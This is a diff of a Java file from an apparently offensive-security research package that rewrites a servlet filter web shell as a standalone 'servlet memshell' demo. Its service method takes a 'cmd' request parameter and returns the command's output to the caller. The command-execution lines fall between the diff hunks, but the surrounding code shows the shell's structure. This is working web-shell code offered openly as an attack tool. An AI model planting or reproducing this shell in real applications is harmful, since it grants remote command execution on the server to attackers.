@@ -1,6 +1,6 @@
-package cc.saferoad.Test;/*
+package cc.saferoad.servlet.servletmemshell;/*
 @auther S0cke3t
-@date 2021-12-27
+@date 2021-12-29
 */
 
 import javax.servlet.*;
@@ -8,19 +8,20 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.io.PrintWriter;
 
-/**
- * @author 15105
- */
-public class FilterShellTest implements Filter {
-    public FilterShellTest() {
-    }
+public class ServletShellDemo implements Servlet {
     @Override
-    public void init(FilterConfig filterConfig) {
+    public void init(ServletConfig servletConfig) throws ServletException {
 
     }
 
     @Override
-    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+    public ServletConfig getServletConfig() {
+        return null;
+    }
+
+    @Override
+    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
+        servletResponse.getWriter().println("this is a servlet memshell");
         String command = servletRequest.getParameter("cmd");
         if (command != null && !command.isEmpty()) {
             PrintWriter out = servletResponse.getWriter();
@@ -35,7 +36,11 @@ public class FilterShellTest implements Filter {
             out.flush();
             out.close();
         }
-        filterChain.doFilter(servletRequest, servletResponse);
+    }
+
+    @Override
+    public String getServletInfo() {
+        return null;
     }
 
     @Override
